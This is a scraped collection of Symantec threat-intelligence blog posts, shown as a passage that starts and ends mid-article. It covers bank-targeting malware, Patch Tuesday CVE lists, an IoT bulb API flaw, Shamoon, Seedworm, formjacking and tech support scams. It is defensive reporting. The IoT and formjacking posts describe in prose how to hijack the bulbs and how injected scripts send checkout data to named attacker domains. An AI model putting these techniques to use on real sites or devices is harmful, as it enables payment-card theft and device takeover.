known as Cobalt Strike (Trojan.Agentemis) which is capable of opening a backdoor on the computer, communicating with a command and control (C&C) server, and downloading additional payloads. Communication with the C&C server was handled by dynamic DNS infrastructure, which helped shield the location of the attackers. The third type of attack was directed against an organization in Ivory Coast. This organization had also been targeted by the second campaign. This second attack also involved the use of commodity malware, in this case the Remote Manipulator System RAT (Backdoor.Gussdoor), alongside Mimikatz and two custom Remote Desktop Protocol (RDP) tools. Since Mimikatz can be used to harvest credentials and RDP allows for remote connections to computers, it’s likely the attackers wanted additional remote access capability and were interested in moving laterally across the victim’s network. The fourth type of attack began in December 2018 and was directed against organizations in Ivory Coast. The attackers used off-the-shelf malware known as Imminent Monitor RAT (Infostealer.Hawket). All four attack types were first discovered through alerts generated by Symantec’sTargeted Attack Analytics (TAA). TAA leverages advanced artificial intelligence to analyze Symantec’s data lake of telemetry in order to spot patterns associated with targeted attacks. A growing number of attackers in recent years are adopting “living off the land” tactics—namely the use of operating system features or network administration tools to compromise victims' networks. By exploiting these tools, attackers hope to hide in plain sight, since most activity involving these tools is legitimate. However, in each case, a TAA alert was triggered by the attackers maliciously using a legitimate tool. In short, the attackers' use of living off the land tactics led to the discovery of their attacks. Whether the attacks were the work of one or more groups remains unknown. However, they share some commonalities in terms of the tools and tactics employed. Any malware used was off-the-shelf, commodity malware: Cobalt Strike, Imminent Monitor RAT, NanoCore RAT, Remote Manipulator System RAT, and Mimikatz. Additionally, most of the attacks leveraged living off the land tactics, making use of tools such as PowerShell, PsExec, UltraVNC, and RDP. Commodity malware is readily available on the cyber underground. While it may not be as powerful or stealthy as custom-developed tools, it does add a certain level of anonymity to attacks, making it harder to link attacks together and attribute them to any one group of attackers. Until now, Symantec has seen relatively little evidence of these kinds of attacks against the financial sector in West Africa. However, it now appears that there is at least one (and quite possibly more) groups actively targeting banks in the region. Symantec has the following protection in place to protect customers against these attacks: The following list of indicators of compromise is related to African banking attacks. It is likely that these indicators are used by multiple different actors. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/african-financial-attacks"
  },
  {
    "title": "microsoft patch tuesday january 2019",
    "content": "As always, customers are advised to follow these security best practices: Microsoft's summary of the January 2019 releases can be found here:https://portal.msrc.microsoft.com/en-us/security-guidance This month's update covers vulnerabilities in: The following is a breakdown of the issues being addressed this month: Cumulative Security Update for Microsoft Browsers Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-0539)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-0567)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-0568)MS Rating: Critical Microsoft Edge Memory Corruption Vulnerability(CVE-2019-0565)MS Rating: Critical Microsoft Edge Privilege Escalation Vulnerability(CVE-2019-0566)MS Rating: Important Internet Explorer Remote Code Execution Vulnerability(CVE-2019-0541)MS Rating: Important Cumulative Security Update for Microsoft Office Microsoft XmlDocument Privilege Escalation Vulnerability(CVE-2019-0555)MS Rating: Important Microsoft Office SharePoint XSS Vulnerability(CVE-2019-0556)MS Rating: Important Microsoft Office SharePoint XSS Vulnerability(CVE-2019-0557)MS Rating: Important Microsoft Office SharePoint XSS Vulnerability(CVE-2019-0558)MS Rating: Important Microsoft Outlook Information Disclosure Vulnerability(CVE-2019-0559)MS Rating: Important Microsoft Office Information Disclosure Vulnerability(CVE-2019-0560)MS Rating: Important Microsoft Word Information Disclosure Vulnerability(CVE-2019-0561)MS Rating: Important Microsoft SharePoint Privilege Escalation Vulnerability(CVE-2019-0562)MS Rating: Important Microsoft Word Remote Code Execution Vulnerability(CVE-2019-0585)MS Rating: Important Cumulative Security Update for Microsoft Exchange Microsoft Exchange Memory Corruption Vulnerability(CVE-2019-0586)MS Rating: Important Microsoft Exchange Information Disclosure Vulnerability(CVE-2019-0588)MS Rating: Important Cumulative Security Update for Microsoft Windows Kernel Windows Kernel Information Disclosure Vulnerability(CVE-2019-0536)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2019-0549)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2019-0554)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2019-0569)MS Rating: Important Cumulative Security Update for Microsoft Windows Windows Hyper-V Remote Code Execution Vulnerability(CVE-2019-0550)MS Rating: Critical Windows Hyper-V Remote Code Execution Vulnerability(CVE-2019-0551)MS Rating: Critical Windows DHCP Client Remote Code Execution Vulnerability(CVE-2019-0547)MS Rating: Critical Microsoft Windows Privilege Escalation Vulnerability(CVE-2019-0543)MS Rating: Important Windows COM Privilege Escalation Vulnerability(CVE-2019-0552)MS Rating: Important Windows Subsystem for Linux Information Disclosure Vulnerability(CVE-2019-0553)MS Rating: Important Windows Runtime Privilege Escalation Vulnerability(CVE-2019-0570)MS Rating: Important Windows Data Sharing Service Privilege Escalation Vulnerability(CVE-2019-0571)MS Rating: Important Windows Data Sharing Service Privilege Escalation Vulnerability(CVE-2019-0572)MS Rating: Important Windows Data Sharing Service Privilege Escalation Vulnerability(CVE-2019-0573)MS Rating: Important Windows Data Sharing Service Privilege Escalation Vulnerability(CVE-2019-0574)MS Rating: Important Security Update for Jet Database Engine Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0538)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0575)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0576)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0577)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0578)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0579)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0580)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0581)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0582)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0583)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0584)MS Rating: Important Security Update for Microsoft ASP.NET ASP.NET Information Disclosure Vulnerability(CVE-2019-0545)MS Rating: Important ASP.NET Core Denial of Service Vulnerability(CVE-2019-0548)MS Rating: Important ASP.NET Core Denial of Service Vulnerability(CVE-2019-0564)MS Rating: Important Security Update for Visual Studio Microsoft Visual Studio Information Disclosure Vulnerability(CVE-2019-0537)MS Rating: Important Visual Studio Remote Code Execution Vulnerability(CVE-2019-0546)MS Rating: Moderate Security Update for Skype for Android Skype for Android Elevation of Privilege Vulnerability(CVE-2019-0622)MS Rating: Moderate More information is available on Symantec's freeSecurity Centerportal and to our customers through the DeepSight Threat Management System. Himanshu is a senior member of Symantec's Cyber Security Services organization. An active contributor to numerous security communities, he frequently provides insight on vulnerabilities and shares his knowledge by writing reports, blogs, and journals. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/microsoft-patch-tuesday-january-2019"
  },
  {
    "title": "leaky christmas lights hijacked",
    "content": "Internet of Things (IoT) devices for the home continue to be popular, and many people may be considering buying more smart home gadgets this Christmas. It seems that every device now has a smart version that can be integrated into the home network, from microwaves to showers, from heating to smoke detectors. Symantec constantly analyzes the risks associated with IoT devices and their various possible attack vectors. Recently, while looking at new threats to IoT devices, we came across some security issues in a remote-controlled, full-color LED light bulb. It’s a low-priced brand that can be bought at many online stores and is easy to use and integrate with popular voice-activated smart assistants. In order to set up and use the light bulb to its full extent, the user has to install a smartphone app and create a free account. The light bulb will then be added to the local Wi-Fi network and can be controlled remotely through the internet. The first thing we noticed while analyzing the network traffic was that the smartphone application was mostly using plain HTTP requests to interact with the backend in the cloud. Only a few requests, for example to register a new user or to log in, were sent encrypted over HTTPS. Unfortunately, some of the unencrypted requests contained a lot of private information. For example, when the user decides to change the internal name of a light bulb, an unencrypted POST request is sent with the user’s email address in cleartext and the MD5 hash of the unsalted password. This means that anyone with access to the network could potentially sniff this traffic and brute-force the password hash. If the password is not very complex, there is a very good chance for the attacker to crack it. To make matters worse, the application does not provide an option to change the password; once the user has chosen one, it is fixed. Equipped with this data, an attacker could log into the account and take over all of the user’s light bulbs. Unfortunately, some of the unencrypted requests contained a lot of private information. Anyone in the network path could potentially sniff this traffic and brute-force the password hash. This is not the only device where we have seen information being sent in cleartext. Unfortunately, the use of unencrypted traffic is still very common with many devices and applications. The API on the backend allows a user to find the user account that is associated with a specific light bulb by sending the MAC address of that device. There is no verification to determine whether the user account used to query a device is actually associated with that device. Therefore, an attacker only needs an active session that has already been authenticated, and can then guess or brute-force the MAC address of a target device. This method allows an attacker to enumerate all possible MAC addresses for the vendor in question and find any light bulb that is activated and remotely controllable. For each device that is found, the attacker receives the unique ID and the user’s email address in cleartext. The request is a simple GET request over plain HTTP. An attacker could use this trick to gather valid email addresses and use them in further attacks, such as spam, or use the gathered information to attack the light bulb itself. Once a remote-controllable device is found, an attacker can interact with the device. This action does not require knowledge of the password. Similar to the enumeration weakness, all that is required is an authenticated session and the MAC address of the device. Each light bulb can be controlled by multiple users and can therefore also be linked to multiple accounts. Once the connection is established, the attacker can turn the lights off or on, change the color, or rename it. The attacker gains full control over the lights, just like it was their own home. The vendor did previously upgrade the applications to use a more secure API function that requires a security token. Unfortunately, for legacy reasons, the old API is still accepting the unsecure requests. Once the connection is established, the attacker can turn the lights off or on, change the color, or rename it. The attacker gains full control over the lights, just like it was their own home. This is just one example showcasing that there are still a lot of simple security gaps within IoT devices that need to be fixed. Fancy exploits are not always required to take over such devices. Sometimes, as demonstrated in this case, simple design mistakes can be enough to expose users’ private data and devices to the public internet. Anyone could have taken over these smart light bulbs and controlled them. As of this writing, we do not have any indication that these devices have been exploited in the wild. We have reported all findings to the manufacturer. Other researchers have also found related issues with similar products. And of course, there are more possible attack vectors, even with these light bulbs, that we have not covered in this blog. Buyers of such IoT devices need to be aware of the potential risks they expose themselves to. As attacks go, having your smart light bulbs remotely controlled by an attacker might not be so severe, but it could be unsettling nonetheless, and it could be only the first step in a bigger attack scenario. Thus, make sure to follow some of these basic guidelines when installing smart devices over the holiday season, so attackers will not be able to turn off your Christmas lights: Candid Wueest works for Symantec's Security Technology and Response (STAR) division. He analyzes new security threats, advises on mitigation strategies, and writes research reports on new emerging security trends such as threats to the Internet of Things. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/leaky-christmas-lights-hijacked"
  },
  {
    "title": "shamoon destructive threat re emerges new sting its tail",
    "content": "After a two-year absence, the destructive malware Shamoon (W32.Disttrack.B)re-emerged on December 10 in a new wave of attacks against targets in the Middle East. These latest Shamoon attacks are doubly destructive, since they involve a new wiper (Trojan.Filerase) that deletes files from infected computers before the Shamoon malware wipes the master boot record. News of the attacks first emerged on December 10 when Italian oil services firm Saipem said that it had beenhit by a cyber attackagainst its servers in the Middle East. Two days later,the company saidthat Shamoon had been used in the attack, which affected between 300 and 400 servers and up to 100 personal computers. Symantec has found evidence of attacks against two other organizations during the same week, in Saudi Arabia and the United Arab Emirates. Both organizations are involved in the oil and gas industry. Unlike previous Shamoon attacks, these latest attacks involve a new, second piece of wiping malware (Trojan.Filerase). This malware will delete and overwrite files on the infected computer. Shamoon itself will meanwhile erase the master boot record of the computer, rendering it unusable. The addition of the Filerase wiper makes these attacks more destructive than use of the Shamoon malware alone. While a computer infected by Shamoon could be unusable, files on the hard disk may be forensically recoverable. However, if the files are first wiped by the Filerase malware, recovery becomes impossible. Filerase is spread across the victim’s network from one initial computer using a list of remote computers. This list is in the form of a text file and is unique to each victim, meaning the attackers likely gathered this information during an earlier reconnaissance phase of the intrusion. This list is first copied by a component called OCLC.exe and passed on to another tool called Spreader.exe. The Spreader component will then copy Filerase to all the computers listed. It will then simultaneously trigger the Filerase malware on all infected machines. It is possible that the Shamoon malware itself was spread via these same tools, but this is unknown. In at least one instance, Shamoon was executed using PsExec, indicating that the attackers had access to credentials for the network. One of the new Shamoon victims Symantec observed the organization in Saudi Arabia had recently also been attacked by another group Symantec calls Elfin (aka APT33) and had been infected with the Stonedrill malware (Trojan.Stonedrill). There were additional attacks against this organization in 2018 that may have been related to Elfin or could have been the work of yet another group. The proximity of the Elfin and the Shamoon attacks against this organization means it is possible that the two incidents are linked. Shamoon (W32.Disttrack)first emerged in 2012when it was used in a series of disruptive attacks against the Saudi energy sector. Activity then ceased until it madea surprise comeback in late 2016. A slightly modified version of the malware (W32.Disttrack.B)was used in attacks against a range of targets, again in Saudi Arabia. The attacks appeared timed to cause maximum destruction. The malware was configured to trigger at 8:45pm local time on Thursday, November 17, 2016. The Saudi working week runs from Sunday to Thursday, meaning computers were wiped after most staff had left for the weekend, minimizing the chance of discovery before the attack was complete. Why Shamoon has suddenly been deployed again remains unknown. However, the fact that the malware seems to be taken out of retirement every few years means that organizations need to remain vigilant and ensure that all data is properly backed up and a robust security strategy is in place. Symantec has the following protections in place against the Shamoon attacks: File-based protections Network-based protections (Intrusion Prevention System) Customers of the DeepSight IntelligenceManaged Adversary and Threat Intelligence(MATI) service have received reports on Shamoon which detail methods of detecting and thwarting activities of this adversary.. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/shamoon-destructive-threat-re-emerges-new-sting-its-tail"
  },
  {
    "title": "microsoft patch tuesday december 2018",
    "content": "As always, customers are advised to follow these security best practices: Microsoft's summary of the December 2018 releases can be found here:https://portal.msrc.microsoft.com/en-us/security-guidance This month's update covers vulnerabilities in: The following is a breakdown of the issues being addressed this month: Cumulative Security Update for Microsoft Browsers Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8583)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8617)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8618)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8629)MS Rating: Critical Internet Explorer Memory Corruption Vulnerability(CVE-2018-8631)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8624)MS Rating: Critical Internet Explorer Remote Code Execution Vulnerability(CVE-2018-8619)MS Rating: Important Windows VBScript Engine Remote Code Execution Vulnerability(CVE-2018-8625)MS Rating: Important Scripting Engine Memory Corruption Vulnerability(CVE-2018-8643)MS Rating: Important Cumulative Security Update for Microsoft Office Microsoft SharePoint Information Disclosure Vulnerability(CVE-2018-8580)MS Rating: Important Microsoft Outlook Remote Code Execution Vulnerability(CVE-2018-8587)MS Rating: Important Microsoft Excel Remote Code Execution Vulnerability(CVE-2018-8597)MS Rating: Important Microsoft Excel Information Disclosure Vulnerability(CVE-2018-8598)MS Rating: Important Microsoft Excel Information Disclosure Vulnerability(CVE-2018-8627)MS Rating: Important Microsoft PowerPoint Remote Code Execution Vulnerability(CVE-2018-8628)MS Rating: Important Microsoft SharePoint Server Privilege Escalation Vulnerability(CVE-2018-8635)MS Rating: Important Microsoft Excel Remote Code Execution Vulnerability(CVE-2018-8636)MS Rating: Important Microsoft Office SharePoint XSS Vulnerability(CVE-2018-8650)MS Rating: Important Cumulative Security Update for Microsoft Windows Kernel Windows Kernel Information Disclosure Vulnerability(CVE-2018-8477)MS Rating: Important Windows Kernel Privilege Escalation Vulnerability(CVE-2018-8611)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2018-8621)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2018-8622)MS Rating: Important Win32k Information Disclosure Vulnerability(CVE-2018-8637)MS Rating: Important Win32k Privilege Escalation Vulnerability(CVE-2018-8639)MS Rating: Important Win32k Privilege Escalation Vulnerability(CVE-2018-8641)MS Rating: Important Cumulative Security Update for Microsoft Windows Windows DNS Server Heap Overflow Vulnerability(CVE-2018-8626)MS Rating: Critical Microsoft Text-To-Speech Remote Code Execution Vulnerability(CVE-2018-8634)MS Rating: Critical Remote Procedure Call runtime Information Disclosure Vulnerability(CVE-2018-8514)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2018-8595)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2018-8596)MS Rating: Important Diagnostics Hub Standard Collector Service Privilege Escalation Vulnerability(CVE-2018-8599)MS Rating: Important Connected User Experiences and Telemetry Service Denial of Service Vulnerability(CVE-2018-8612)MS Rating: Important DirectX Information Disclosure Vulnerability(CVE-2018-8638)MS Rating: Important Windows Denial of Service Vulnerability(CVE-2018-8649)MS Rating: Important Security Update for Microsoft .NET Framework .NET Framework Remote Code Injection Vulnerability(CVE-2018-8540)MS Rating: Critical .NET Framework Denial Of Service Vulnerability(CVE-2018-8517)MS Rating: Important Security Update for Microsoft Exchange Server Microsoft Exchange Server Tampering Vulnerability(CVE-2018-8604)MS Rating: Important Security Update for Microsoft Windows Azure Pack Windows Azure Pack Cross Site Scripting Vulnerability(CVE-2018-8652)MS Rating: Important Security Update for Microsoft Dynamics NAV Microsoft Dynamics NAV Cross Site Scripting Vulnerability(CVE-2018-8651)MS Rating: Important More information is available on Symantec's freeSecurity Centerportal and to our customers through the DeepSight Threat Management System. Ratheesh is a member of Symantec's Cyber Security Services organization which provides round-the-clock monitoring and protection services against cyber attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/microsoft-patch-tuesday-december-2018"
  },
  {
    "title": "seedworm espionage group",
    "content": "Symantec researchers have uncovered extensive insights into a cyber espionage group behind a recent series of cyber attacks designed to gather intelligence on targets spread primarily across the Middle East as well as in Europe and North America. The group, which we call Seedworm (aka MuddyWater), has been operating since at least 2017, with its most recent activity observed in December 2018. Analysts in ourDeepSight Managed Adversary and Threat Intelligence(MATI) team have found a new backdoor,Backdoor.Powemuddy, new variants of Seedworm’s Powermud backdoor (aka POWERSTATS), a GitHub repository used by the group to store their scripts, as well as several post-compromise tools the group uses to exploit victims once they have established a foothold in their network. In September 2018, we found evidence of Seedworm and the espionage groupAPT28(aka Swallowtail, Fancy Bear), on a computer within the Brazil-based embassy of an oil-producing nation. Seeing two active groups piqued our interest and, as we began pulling on that one string, we found more clues that led us to uncover new information about Seedworm. We not only found the initial entry point, but we were able to follow Seedworm’s subsequent activity after the initial infection due to the vast telemetry Symantec has access to via its Global Intelligence Network. Because of this unique visibility, our analysts were able to trace what actions Seedworm took after they got into a network. We found new variants of the Powermud backdoor, a new backdoor (Backdoor.Powemuddy), and custom tools for stealing passwords, creating reverse shells, privilege escalation, and the use of the native Windows cabinet creation tool, makecab.exe, probably for compressing stolen data to be uploaded.DeepSight MATIcustomers can leverage these unique insights to combat emerging cyber threats. Seedworm’s motivations are much like many cyber espionage groups that we observe—they seek to acquire actionable information about the targeted organizations and individuals. They accomplish this with a preference for speed and agility over operational security, which ultimately led to our identification of their key operational infrastructure. Seedworm likely functions as a cyber espionage group to secure actionable intelligence that could benefit their sponsor’s interests. During the operations, the group used tools consistent with those leveraged during past intrusions including Powermud, a custom tool used by the Seedworm group, and customized PowerShell, LaZagne, and Crackmapexec scripts. The Seedworm group controls its Powermud backdoor from behind a proxy network to hide the ultimate command-and-control (C&C) location. The Seedworm group is the only group known to use the Powermud backdoor. After compromising a system, typically by installing Powermud or Powemuddy, Seedworm first runs a tool that steals passwords saved in users’ web browsers and email, demonstrating that access to the victim's email, social media, and chat accounts is one of their likely goals. Seedworm then uses open-source tools such as LaZagne and Crackmapexec to obtain Windows authorization credentials. Seedworm uses off-the-shelf, unmodified versions of these tools as well as custom-compiled variants which we have determined are only used by this group. Since its existence first came to light, we’ve seen Seedworm modify the way it operates. Since early 2017, they have continually updated their Powermud backdoor and other tools to avoid detection and to thwart security researchers analyzing the tools. They’ve also used GitHub to store malware and a handful of publicly available tools, which they then customize to carry out their work. We have identified multiple online accounts that are likely associated with actors behind the Seedworm operations. The first finding was a public Github repository containing scripts that very closely match those observed in Seedworm operations. An additional link was then made to a persona on Twitter with similar profile data. This Twitter account follows numerous security researchers, including those who have written about the group in the past as well as developers who write the open-source tools they use. These accounts are likely controlled by the Seedworm group. The Github repository contains a PowerShell script that has been run on victim hosts in activity attributed to Seedworm; there are also numerous Crackmapexec PowerShell commands that match victim host activity. Choosing to rely on publicly available tools allows Seedworm to quickly update their operations by using code written by others and applying only small customizations. And they appear to adopt some of the most effective and capable tools, several of which—for these reasons—are also used by red team organizations. We analyzed data on 131 victims that were compromised by Seedworm’s Powermud backdoor from late September to mid-November 2018. Observed Seedworm victims were located primarily in Pakistan and Turkey, but also in Russia, Saudi Arabia, Afghanistan, Jordan, and elsewhere. Additionally, the group compromised organizations in Europe and North America that have ties to the Middle East. Additionally, during our analysis of Powermud victims, we were able to identify the probable industry sector for 80 of the 131 unique victims. The telecommunications and IT services sectors were the main targets. Entities in these sectors are often \"enabling victims\" as telecommunications providers or IT services agencies and vendors could provide Seedworm actors with further victims to compromise. Successfully compromising victims in these two industries provides additional clues about the sophistication and skills of the Seedworm group. The next most common group of victims was in the oil and gas sector. All 11 victims in this group belong to one Russian firm that is active in the Middle East. Only one of these 11 victims was physically located in Russia; the rest were spread out across North America, the Middle East, Africa, and Asia. Universities and embassies were the next most common targets. The universities were in the Middle East and the embassies were primarily based in Europe representing Middle East countries. Two major non-governmental organizations (NGOs) were also compromised; we identified seven victims who worked within these global public health organizations. Symantec has notified the appropriate public and private sector partners regarding Seedworm’s latest targets, tools and techniques.. The following protections are in place to protect customers against Seedworm attacks: File-based protection Network-based protection The following indicators are specific to Seedworm: Symantec’s managed adversary and threat intelligence (MATI) team of intelligence analysts & researchers are dedicated to understanding the adversary ecosystem and providing insightful customer reports detailing their plans, tactics, tools, and campaigns. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/seedworm-espionage-group"
  },
  {
    "title": "formjacking targeting popular stores",
    "content": "Formjacking, the use of malicious JavaScript code to steal credit card details and other information from payment forms on the checkout webpages of e-commerce sites, has been making headlines lately. In ourprevious blog, we discussed how formjacking generally works and cited a few publicly reported attacks that targeted popular online businesses. In this blog, we look at the more technical aspects of formjacking and detail a new campaign affecting a number of top shopping sites. Recently, we came across a website of a retail store in Paris which was injected with a formjacking script (Figure 1). The code shown in Figure 1 collects the payment information entered by users on the website and posts it to the domaingoogle-analyitics.org. This domain is a typo-squatted version of the legitimate Google Analytics domain,google-analytics.com. This was no new occurrence for us, considering the number of payment information-stealing script injections we see daily. However, digging into our telemetry, we came across an interesting pattern. We observed popular websites from different countries—such as the U.S., Japan, Australia, and Germany—redirecting to this one Paris website. This created an interesting redirection chain as customers of all these websites were being infected by formjacking at the same time. Figure 2 shows how this infection chain works. In a few cases, even all the regional websites of one brand were affected, redirecting to the same Paris website. We have been able to identify over 30 popular websites affected by this new infection wave, including fashion stores, educational websites, websites selling sports gear, etc. Looking at our telemetry, we can confirm that this campaign has been around since at least November 25, 2018. To make matters worse, another piece of injected code on the same web page looks for the presence of debugging tools, such as Firebug, to thwart security researchers analyzing the malicious script. This latest formjacking campaign highlights the fact that attackers are continuously altering and improving their malicious code and exploring new delivery mechanisms to infect more users. This attack chain is unique in the sense that it differs from the prevalent supply chain formjacking attack, where attackers compromise popular third-party script library providers. As these scripts are loaded by many websites, with one compromise the attacker manages to load their malicious code on a large number of websites all at the same time. In our scenario, the redirecting website and the compromised website in many cases come from different areas of the online shopping landscape, dealing in entirely different product spaces. Symantec is currently notifying and working with the affected retailers to help address this issue, so we won’t be naming them here. This latest formjacking campaign highlights the fact that attackers are continuously altering and improving their malicious code and exploring new delivery mechanisms to infect more users. In addition to the code previously mentioned, we have seen many other scripts injected into websites to steal payment information in various ways. For example, the code shown in Figure 4 was injected into one set of affected websites. The script creates a script element and sets its source tohttps://apitstatus.com/api.js?v=3.0.8. This forces the browser to load malicious obfuscated JavaScript fromapitstatus.com, which in turn collects the entered payment information and posts it back to the attackers’ domain. On yet another set of websites, we discovered the code shown in Figure 5. This obfuscated script applies a hook onto forms on the website and collects all the information entered by visitors. The script also extracts the URL loaded in the browser and determines if the checkout page of the website is loaded. If it has, the script sends the collected form information, which is now the payment information, back to the attacker-controlled domain. This version of a formjacking script was used in various high-profile breaches such as Ticketmaster UK, Shopper Approved, and Feedify. In recent months, we have seen a major uptick in formjacking attacks against high-profile websites across the globe. From our telemetry, we have also observed locally popular websites (those with an Alexa Rank of less than 5,000 in a particular country) in the U.S., Japan, Germany, and Australia, among other countries, being injected with formjacking scripts. Symantec’s Intrusion Prevention System (IPS) technology proactively protects website users from formjacking attacks. In the past three months alone, IPS has blocked more than 1 million formjacking attempts on more than 10,000 unique websites. Taking into account supply chain attacks, which can allow attackers to gain access to large companies by exploiting weaknesses in smaller businesses used by the larger company to provide different services, we can easily say that the actual number of infected websites is bound to be higher. Victims may not realize they are victims of formjacking, as generally their websites continue to operate as normal, and attackers are sophisticated and stealthy and take steps to avoid detection. Symantec customers are protected from formjacking attacks. Website owners should also be aware of the dangers of software supply chain attacks, as these have been used as the infection vector in some of these formjacking attacks. Software supply chain attacks can be difficult to guard against, but there are some steps that website owners can take: Producers of software packages should ensure that they are able to detect unwanted changes in the software update process and on their website. Website owners can also use content security policies withSubresource Integrity (SRI) tagsto lock down any integrated third-party scripts. Siddhesh works for the Intrusion Prevention System (IPS) team in Symantec's Security Technology and Response (STAR) division. He analyzes and creates IPS protection for various network-based threats such as exploit kits and tech support scams. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/formjacking-targeting-popular-stores"
  },
  {
    "title": "tech support scams part 3",
    "content": "In my previousblog, I discussed how technical support scammers embraced the technique of “living off the land” by making use of encryption algorithms such as Advanced Encryption Standard (AES) to obfuscate scam content. In the past, I alsowroteabout scammers’ use of simple encoding techniques to avoid string-based detection engines. In both scenarios, the scam made use of one unique technique across the board. The same obfuscation technique was used multiple times to decode the content on the fly and then perform its intended tasks: scaring the victim through various means, such as non-closing windows, pop-up windows which never seem to go away, preventing the victim from closing the scam by disallowing the pressing of certain keyboard keys, among others. This blog completes my trilogy of posts on obfuscated scams. This time, I look at how scammers make use of multiple encoding techniques at one go to create a multiple-level obfuscated scam which offers very little scope for detection engines. Typically, the scam starts when an unsuspecting user visits a malicious website or is redirected to one by various means, such as a malvertisement or compromised website. One such scam I observed on November 9 was in Italian, although similar campaigns may also come in other languages. This one in particular informs the victim that their computer has been blocked due to “display and dissemination of materials prohibited by Italian law” such as adult content. It also informs the victim that to unblock their computer, they must pay an “administrative penalty” of 500 euros with an iTunes Gift Card. Such tactics are designed to incite worry among victims and get them to pay. Going through the source code of the scam reveals a large chunk of obfuscated content, as shown in Figure 2. Moving further, I observed the code used for decryption of this obfuscated data: First, the obfuscated content is captured into a variable and then converted into a base64-encoded content. Then, this base64-encoded content is decoded using the function “atob” and written on the browser, as shown in Figure 3. After decoding the base64 content, I was able to see a few of the strings which the scam displays to the victim. However, the story does not end here. Moving further, I could still see obfuscated code and decryption routines being used. The code also loads the following JavaScript library, which is interesting: <script src=“https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js”></script><script> This CryptoJS library is widely used for AES obfuscation and deobfuscation. This indicates the scam uses AES as its second-level obfuscation technique. Decoding the AES obfuscated content reveals the final layer of the scam with almost no obfuscation being used. While code obfuscation has been used in scams for a while now, the use of multiple-level encoding is not common. The scam typically forces string-based detection engines to focus detection on strings of random numbers or characters as described above, which, in most scenarios, is highly prone to false positives. Thus, it can be said that this scam uses living off the land encoding techniques to sneak through antivirus engines and avoid detection. Symantec proactively protects customers against tech support scams. Our intrusion prevention system (IPS) technology protects customers against tech support scams by blocking malicious network activity associated with such scams using a wide variety of detections. From July through October 2018, Symantec’s IPS technology blocked more than 37 million tech support scams. Our IPS telemetry for this year shows that the countries most targeted by tech support scams were the U.S., Japan, Canada, UK, and Germany. From July through October 2018, Symantec IPS technology blocked more than 37 million tech support scams. Our IPS telemetry for 2018 shows that the countries most targeted by these scams were the U.S., Japan, Canada, UK, and Germany. Norton Security,Symantec Endpoint Protection, and many otherSymantec security productshave comprehensive network-based protection features such as firewall and IPS built in. To protect yourself from these types of scams, ensure that these features are enabled. Also, make sure to only visit legitimate websites when you need support for any product. Last but not least, make sure your security product is updated regularly. More information on tech support scams can be foundhere. Siddhesh works for the Intrusion Prevention System (IPS) team in Symantec's Security Technology and Response (STAR) division. He analyzes and creates IPS protection for various network-based threats such as exploit kits and tech support scams. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/tech-support-scams-part-3"
  },
  {
    "title": "eversion 3ve arrests takedown",
    "content": "An FBI-led law enforcement takedown dubbedOperation Eversion has led to the indictment of eight defendantsand the seizure of infrastructure associated with the 3ve ad-fraud scam. Symantec was involved in an industry group which assisted in the investigation by helping identify infrastructure used by the attackers. 3ve specializes in creating fake versions of legitimate websites in order to carry advertisements. It then drives fake traffic to these advertisements using infected computers. These fake visitors generate click-through revenue from the ads for the attackers. 3ve leveraged up to 700,000 infected computers and controlled over 1.7 million IP addresses at one point. Much of the fraudulent traffic was facilitated through botnets controlled by the Miuref (Trojan.Miuref) and Kovter (Trojan.Kotver) malware families. The machines that used the Miuref botnet were located mostly in data centers and were tasked with browsing to counterfeit websites. When the websites were loaded into a browser, requests were made for ads to be placed on those pages. These data center computers used the Miuref botnet as a proxy to request the ads in order to hide the true location of the request. The Kovter component of the ad-fraud operation used the Kovter botnet to run a hidden instance of the Chrome web browser on infected computers. The browser was used to visit the counterfeit websites. Once loaded, they requested ads to be placed on the website pages. 